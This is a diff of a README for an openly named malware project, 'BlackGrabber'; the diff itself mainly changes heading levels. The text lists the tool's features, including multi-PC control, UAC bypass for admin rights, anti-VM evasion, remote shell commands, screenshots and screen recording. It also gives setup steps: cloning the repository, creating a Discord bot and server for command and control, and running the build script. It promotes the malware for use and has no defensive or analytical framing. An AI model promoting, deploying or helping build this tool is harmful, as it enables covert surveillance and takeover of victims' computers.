@@ -8,9 +8,9 @@
 
 
 - Read our extensive Wiki for more information and detailed building instructions.
-### BlackGrabber Community
+## BlackGrabber Community
 - Join our Telegram and Discord servers for support, to ask questions, recommend features and talk to like minded people!
-### Features
+## Features
 - Black Grabber malware can do plenty of things, like:
 - handle multiple PCs (not only one, like in most of the cases)
 - UAC Bypass (gain Administrative permissions on startup)
@@ -47,7 +47,9 @@
 - Anti-VM (Brack Grabber won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
 - run shell commands (CMD/Powershell)
 - Debug Mode for easier testing and contribution
-### Preparation git clone https://github.com/mategol/blackgrabber-malware
+## Preparation
+- git clone https://github.com/mategol/blackgrabber-malware
+
 - cd blackgrabber-malware
 
 - Create Discord BOT and server
@@ -56,7 +58,7 @@
 
 - Linux: Run the blackgrabber.sh from Command Line
 
-### Commands
+## Commands
  
 ```.ss - take screenshot at any time
 .screenrec - record the screen for 15 seconds
